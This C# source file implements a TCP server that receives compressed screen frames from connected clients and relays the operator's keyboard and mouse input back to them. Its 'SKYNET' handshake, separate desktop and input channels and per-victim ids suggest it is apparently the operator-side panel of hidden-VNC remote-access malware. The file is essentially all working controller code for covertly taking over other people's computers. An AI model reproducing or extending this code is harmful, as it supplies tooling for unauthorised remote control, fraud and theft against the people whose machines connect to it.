using Server.Connection;
using System;
using System.Drawing;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Server.MessagePack
{
    public class Server
    {
        public struct RECT
        {
            public int Left;

            public int Top;

            public int Right;

            public int Bottom;

            public int X
            {
                get
                {
                    return Left;
                }
                set
                {
                    Right -= Left - value;
                    Left = value;
                }
            }

            public int Y
            {
                get
                {
                    return Top;
                }
                set
                {
                    Bottom -= Top - value;
                    Top = value;
                }
            }

            public int Height
            {
                get
                {
                    return Bottom - Top;
                }
                set
                {
                    Bottom = value + Top;
                }
            }

            public int Width
            {
                get
                {
                    return Right - Left;
                }
                set
                {
                    Right = value + Left;
                }
            }

            public Point Location
            {
                get
                {
                    return new Point(Left, Top);
                }
                set
                {
                    X = value.X;
                    Y = value.Y;
                }
            }

            public Size Size
            {
                get
                {
                    return new Size(Width, Height);
                }
                set
                {
                    Width = value.Width;
                    Height = value.Height;
                }
            }

            public RECT(int left, int top, int right, int bottom)
            {
                Left = left;
                Top = top;
                Right = right;
                Bottom = bottom;
            }

            public RECT(Rectangle r)
                : this(r.Left, r.Top, r.Right, r.Bottom)
            {
            }

            public static implicit operator Rectangle(RECT r)
            {
                return new Rectangle(r.Left, r.Top, r.Width, r.Height);
            }

            public static implicit operator RECT(Rectangle r)
            {
                return new RECT(r);
            }

            public static bool operator ==(RECT r1, RECT r2)
            {
                return r1.Equals(r2);
            }

            public static bool operator !=(RECT r1, RECT r2)
            {
                return !r1.Equals(r2);
            }

            public bool Equals(RECT r)
            {
                if (r.Left == Left && r.Top == Top && r.Right == Right)
                {
                    return r.Bottom == Bottom;
                }
                return false;
            }

            public override bool Equals(object obj)
            {
                if (obj is RECT)
                {
                    return Equals((RECT)obj);
                }
                if (obj is Rectangle)
                {
                    return Equals(new RECT((Rectangle)obj));
                }
                return false;
            }

            public override int GetHashCode()
            {
                return ((Rectangle)this).GetHashCode();
            }

            public override string ToString()
            {
                return string.Format(CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", Left, Top, Right, Bottom);
            }
        }

        public delegate void DisconnectedClientEvent(object sender, int address);

        public delegate void ConnectedClientEvent(object sender, int address);

        private delegate IntPtr WinProc(IntPtr hWnd, uint Msg, int wParam, int lParam);

        private const string gc_magik = "SKYNET\0";

        private const int gc_sleepNotRecvPixels = 33;

        private static long Counter = 0L;

        private static readonly Color TransparentColor = Color.FromArgb(255, 174, 201);

        internal static byte[] latestBytes = null;

        internal int ImageWidth;

        internal int ImageHeight;

        internal static IntPtr hParentWnd = IntPtr.Zero;

        internal static Control parentControl = null;

        internal int port;

        internal bool stopped = true;
        internal static Client[] g_clients = new Client[256];

        internal TcpListener listener;

        private const int GWL_WNDPROC = -4;

        private const int VK_LBUTTON = 1;

        private const int VK_RBUTTON = 2;

        private const int VK_CANCEL = 3;

        private const int VK_MBUTTON = 4;

        private const int VK_BACK = 8;

        private const int VK_RETURN = 13;

        private const int VK_PRIOR = 33;

        private const int VK_NEXT = 34;

        private const int VK_END = 35;

        private const int VK_HOME = 36;

        private const int VK_LEFT = 37;

        private const int VK_UP = 38;

        private const int VK_RIGHT = 39;

        private const int VK_DOWN = 40;

        private const int VK_SELECT = 41;

        private const int VK_PRINT = 42;

        private const int VK_EXECUTE = 43;

        private const int VK_SNAPSHOT = 44;

        private const int VK_INSERT = 45;

        private const int VK_DELETE = 46;

        private const int VK_HELP = 47;

        private const int WM_KEYDOWN = 256;

        private const int WM_KEYUP = 257;

        private const int WM_CHAR = 258;

        private const int WM_MOUSEMOVE = 512;

        private const int WM_LBUTTONDOWN = 513;

        private const int WM_LBUTTONUP = 514;

        private const int WM_LBUTTONDBLCLK = 515;

        private const int WM_RBUTTONDOWN = 516;

        private const int WM_RBUTTONUP = 517;

        private const int WM_RBUTTONDBLCLK = 518;

        private const int WM_MBUTTONDOWN = 519;

        private const int WM_MBUTTONUP = 520;

        private const int WM_MBUTTONDBLCLK = 521;

        private const int WM_MOUSEWHEEL = 522;

        public DisconnectedClientEvent OnDisconnected;

        public ConnectedClientEvent OnConnected;

        private static WinProc newWndProc = null;

        private static IntPtr oldWndProc = IntPtr.Zero;

        [DllImport("ntdll.dll")]
        private static extern int RtlCompressBuffer(ushort formatAndEngine, IntPtr uncompressedBuffer, uint uncompressedBufferSize, IntPtr compressedBuffer, uint compressedBufferSize, uint uncompressedChunkSize, out uint finalCompressedSize, IntPtr workspace);

        [DllImport("ntdll.dll")]
        private static extern int RtlDecompressBuffer(ushort formatAndEngine, IntPtr uncompressedBuffer, uint uncompressedBufferSize, IntPtr compressedBuffer, uint compressedBufferSize, out uint finalUncompressedSize);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowLong(IntPtr hWnd, int nIndex, WinProc newProc);

        [DllImport("user32.dll")]
        private static extern WinProc GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern IntPtr DefWindowProc(IntPtr hWnd, uint uMsg, int wParam, int lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, int wParam, int lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern bool GetClientRect(IntPtr hWnd, ref RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public byte[] GetDesktopImageBytes()
        {
            lock (g_clients)
            {
                return latestBytes;
            }
        }

        private static Client GetClient(IntPtr data, bool uhid)
        {
            for (int i = 0; i < g_clients.Length; i++)
            {
                if (uhid)
                {
                    if (g_clients[i].uhid == data.ToInt64())
                    {
                        return g_clients[i];
                    }
                }
                else if (g_clients[i].hWnd == data)
                {
                    return g_clients[i];
                }
            }
            return null;
        }

        private static int SendInt(TcpClient client, long i, int size)
        {
            byte[] bytes = BitConverter.GetBytes(i);
            try
            {
                client.GetStream().Write(bytes, 0, size);
                return size;
            }
            catch (Exception)
            {
                return 0;
            }
        }

        private static bool SendClientInput(TcpClient client, uint msg, long wParam, long lParam)
        {
            if (SendInt(client, msg, 4) <= 0)
            {
                return false;
            }
            if (SendInt(client, wParam, IntPtr.Size) <= 0)
            {
                return false;
            }
            if (SendInt(client, lParam, IntPtr.Size) <= 0)
            {
                return false;
            }
            return true;
        }

        public void SetParentWindow(Control control)
        {
            if (hParentWnd == IntPtr.Zero)
            {
                hParentWnd = control.Handle;
                parentControl = control;
                newWndProc = NewWndProc;
                oldWndProc = SetWindowLong(control.Handle, -4, newWndProc);
            }
        }

        private static Point GetPoint(IntPtr _xy)
        {
            int num = (int)((IntPtr.Size == 8) ? _xy.ToInt64() : _xy.ToInt32());
            int x = (short)num;
            int y = (short)((uint)num >> 16);
            return new Point(x, y);
        }

        private static long MAKELPARAM(long wLow, long wHigh)
        {
            return (wLow & 0xFFFF) | ((wHigh & 0xFFFF) << 16);
        }

        private static IntPtr NewWndProc(IntPtr hWnd, uint msg, int wParam, int lParam)
        {
            Client client = GetClient(hWnd, uhid: false);
            if (msg - 256 > 1)
            {
                if (msg != 258)
                {
                    if (msg - 512 <= 10 && (msg != 512 || GetKeyState(1) < 0) && client != null)
                    {
                        RECT lpRect = default(RECT);
                        Point point = GetPoint((IntPtr)lParam);
                        GetClientRect(hWnd, ref lpRect);
                        float num = (float)client.screenWidth / (float)lpRect.Right;
                        float num2 = (float)client.screenHeight / (float)lpRect.Bottom;
                        long wLow = (long)((float)point.X * num);
                        long wHigh = (long)((float)point.Y * num2);
                        lParam = (int)MAKELPARAM(wLow, wHigh);
                        lock (g_clients)
                        {
                            if (!SendClientInput(client.inputClient, msg, wParam, lParam))
                            {
                                Disconnect(client);
                            }
                        }
                    }
                }
                else if (client != null && ((wParam != 127 && (wParam < 0 || wParam > 31)) || wParam == 13))
                {
                    lock (g_clients)
                    {
                        if (!SendClientInput(client.inputClient, msg, wParam, lParam))
                        {
                            Disconnect(client);
                        }
                    }
                }
            }
            else if (wParam == 38 || wParam == 40 || wParam == 39 || wParam == 37 || wParam == 36 || wParam == 35 || wParam == 33 || wParam == 34 || wParam == 45 || wParam == 13 || wParam == 46 || wParam == 8)
            {
                lock (g_clients)
                {
                    if (!SendClientInput(client.inputClient, msg, wParam, lParam))
                    {
                        Disconnect(client);
                    }
                }
            }
            return CallWindowProc(oldWndProc, hWnd, msg, wParam, lParam);
        }

        public bool IsStopped()
        {
            lock (g_clients)
            {
                return stopped;
            }
        }

        private static void Disconnect(Client clientDesc)
        {
            long uhid = clientDesc.uhid;
            if (clientDesc.desktopClient.Connected)
            {
                clientDesc.desktopClient.GetStream().Close();
                clientDesc.desktopClient.Close();
            }
            if (clientDesc.inputClient.Connected)
            {
                clientDesc.inputClient.GetStream().Close();
                clientDesc.inputClient.Close();
            }
            clientDesc.inputClient = null;
            clientDesc.desktopClient = null;
            _ = clientDesc.hWnd;
            clientDesc.hWnd = IntPtr.Zero;
            if (clientDesc.Bitmap != null)
            {
                clientDesc.Bitmap.Dispose();
                clientDesc.Bitmap = null;
            }
            if (clientDesc.pixels != null)
            {
                clientDesc.pixels = null;
            }
            clientDesc.uhid = 0L;
            latestBytes = null;
            parentControl.Invalidate();
            Server server = (Server)clientDesc.Server;
            if (server.OnDisconnected != null)
            {
                server.OnDisconnected(clientDesc.Server, (int)uhid);
            }
        }

        private void ClientThreadProc(object parameter)
        {
            TcpClient tcpClient = (TcpClient)parameter;
            long address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.Address;
            byte[] array = new byte[1024];
            int num = tcpClient.GetStream().Read(array, 0, "SKYNET\0".Length);
            for (int i = 0; i < "SKYNET\0".Length; i++)
            {
                if (array[i] != "SKYNET\0"[i])
                {
                    byte[] destinationArray = new byte[num];
                    Array.Copy(array, 0, destinationArray, 0, num);
                    tcpClient.GetStream().Close();
                    tcpClient.Close();
                    return;
                }
            }
            if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
            {
                tcpClient.GetStream().Close();
                tcpClient.Close();
                return;
            }
            int num2 = BitConverter.ToInt32(array, 0);
            if (num2 == 0)
            {
                Client client = GetClient((IntPtr)address, uhid: true);
                client.desktopClient = tcpClient;
                bool flag = false;
                while (!IsStopped() && !flag)
                {
                    Thread.Sleep(0);
                    RECT lpRect = default(RECT);
                    GetClientRect(hParentWnd, ref lpRect);
                    int num3 = ((lpRect.Right > client.screenWidth && client.screenWidth > 0) ? client.screenWidth : lpRect.Right);
                    int num4 = ((lpRect.Bottom > client.screenHeight && client.screenHeight > 0) ? client.screenHeight : lpRect.Bottom);
                    if (num3 * 3 % 4 != 0)
                    {
                        num3 += num3 * 3 % 4;
                    }
                    if (num3 != 0)
                    {
                    }
                    if (SendInt(tcpClient, num3, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    if (SendInt(tcpClient, num4, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    if (array[0] == 0)
                    {
                        Thread.Sleep(33);
                        continue;
                    }
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    client.screenWidth = BitConverter.ToInt32(array, 0);
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    client.screenHeight = BitConverter.ToInt32(array, 0);
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    int num5 = BitConverter.ToInt32(array, 0);
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    int num6 = BitConverter.ToInt32(array, 0);
                    if (tcpClient.GetStream().Read(array, 0, 4) <= 0)
                    {
                        flag = true;
                        continue;
                    }
                    num = BitConverter.ToInt32(array, 0);
                    byte[] array2 = new byte[num];
                    int num7 = 0;
                    do
                    {
                        int count = Math.Min(array.Length, num - num7);
                        int num8 = tcpClient.GetStream().Read(array, 0, count);
                        if (num8 <= 0)
                        {
                            flag = true;
                            continue;
                        }
                        Array.Copy(array, 0, array2, num7, num8);
                        num7 += num8;
                    }
                    while (num7 != num);
                    uint finalUncompressedSize = (uint)num;
                    int num9 = num5 * 3 * num6;
                    byte[] array3 = new byte[num9];
                    IntPtr intPtr = Marshal.AllocHGlobal(num9);
                    IntPtr intPtr2 = Marshal.AllocHGlobal(num);
                    Marshal.Copy(array2, 0, intPtr2, num7);
                    RtlDecompressBuffer(2, intPtr, (uint)num9, intPtr2, (uint)num, out finalUncompressedSize);
                    Marshal.Copy(intPtr, array3, 0, (int)finalUncompressedSize);
                    Marshal.FreeHGlobal(intPtr2);
                    if (client.pixelsWidth == num5)
                    {
                        _ = client.pixelsHeight;
                    }
                    if (client.pixels == null)
                    {
                        client.pixels = array3;
                    }
                    else
                    {
                        for (int j = 0; j < num9; j += 3)
                        {
                            if (array3[j] != TransparentColor.R || array3[j + 1] != TransparentColor.G || array3[j + 2] != TransparentColor.B)
                            {
                                client.pixels[j] = array3[j];
                                client.pixels[j + 1] = array3[j + 1];
                                client.pixels[j + 2] = array3[j + 2];
                            }
                        }
                        array3 = null;
                    }
                    GC.Collect(2);
                    lock (g_clients)
                    {
                        ImageWidth = num5;
                        ImageHeight = num6;
                        latestBytes = client.pixels;
                    }
                    parentControl.Invalidate();
                    Marshal.FreeHGlobal(intPtr);
                    if (SendInt(tcpClient, 0L, 4) <= 0)
                    {
                        flag = true;
                    }
                }
                Disconnect(client);
            }
            if (num2 != 1)
            {
                return;
            }
            if (OnConnected != null)
            {
                OnConnected(this, (int)address);
            }
            Client client2 = GetClient((IntPtr)address, uhid: true);
            lock (g_clients)
            {
                if (client2 != null)
                {
                    return;
                }
                bool flag2 = false;
                for (int k = 0; k < g_clients.Length; k++)
                {
                    if (g_clients[k].hWnd.ToInt64() == 0L)
                    {
                        flag2 = true;
                        client2 = g_clients[k];
                    }
                }
                if (!flag2)
                {
                    return;
                }
                client2.hWnd = hParentWnd;
                client2.uhid = address;
                client2.inputClient = tcpClient;
                client2.minEvent = new ManualResetEvent(initialState: false);
                SendClientInput(tcpClient, 1025u, 0L, 0L);
            }
            SendInt(tcpClient, 0L, 4);
        }

        private void ListeningThreadProc()
        {
            listener.Start();
            while (!IsStopped())
            {
                if (listener.Pending())
                {
                    TcpClient parameter = listener.AcceptTcpClient();
                    new Thread(ClientThreadProc).Start(parameter);
                }
            }
        }

        public bool StartServer(int port)
        {
            if (this.port == 0)
            {
                this.port = port;
                stopped = false;
                for (int i = 0; i < g_clients.Length; i++)
                {
                    if (g_clients[i] == null)
                    {
                        g_clients[i] = new Client();
                        g_clients[i].Server = this;
                    }
                }
                listener = new TcpListener(IPAddress.Any, port);
                new Thread(ListeningThreadProc).Start();
            }
            return false;
        }

        public bool StopServer()
        {
            lock (g_clients)
            {
                if (!stopped)
                {
                    if (listener != null)
                    {
                        listener.Stop();
                    }
                    hParentWnd = IntPtr.Zero;
                    stopped = true;
                    port = 0;
                }
            }
            return stopped;
        }

        public void Send(uint msg, long wparam, long lparam)
        {
            for (int i = 0; i < g_clients.Length; i++)
            {
                if (g_clients[i].hWnd != IntPtr.Zero)
                {
                    SendClientInput(g_clients[i].inputClient, msg, wparam, lparam);
                }
            }
        }
    }
}
